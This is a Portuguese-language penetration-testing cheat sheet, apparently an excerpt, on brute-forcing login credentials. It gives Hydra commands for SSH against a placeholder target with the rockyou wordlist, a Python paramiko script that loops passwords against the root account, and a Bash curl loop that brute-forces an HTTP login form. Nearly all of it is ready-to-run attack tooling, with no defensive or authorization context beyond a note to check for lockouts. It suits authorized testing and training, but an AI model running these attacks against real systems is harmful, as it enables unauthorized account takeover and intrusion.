## 2. Brute Force SSH

Sempre antes de testar brute-force, testar se não há bloqueios, e também no caso do SSH verificar com o `ssh -v TARGET` se o método de autenticação por password esta ativo, senão de nada vai adiantar.

### 2.1 Hydra
```bash
# Instalação
sudo apt install hydra

# Brute force básico
hydra -l root -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh

# Brute force com usuário específico
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh

# Brute force com lista de usuários
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh

# Brute force com parâmetros específicos
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -W 1 -f TARGET_IP ssh
```

## 11. Brute Force Personalizado

### 11.1 Scripts Python
```python
# Exemplo de brute force SSH
import paramiko
import sys

def ssh_brute_force(host, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=username, password=password)
        print(f"Success: {username}:{password}")
        ssh.close()
        return True
    except:
        return False

# Uso
with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    for password in f:
        if ssh_brute_force('TARGET_IP', 'root', password.strip()):
            break
```

### 11.2 Scripts Bash
```bash
#!/bin/bash
# Exemplo de brute force HTTP
for password in $(cat /usr/share/wordlists/rockyou.txt); do
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -d "username=admin&password=$password" \
        http://TARGET_IP/login)
    if [ "$response" = "200" ]; then
        echo "Success: admin:$password"
        break
    fi
done
```
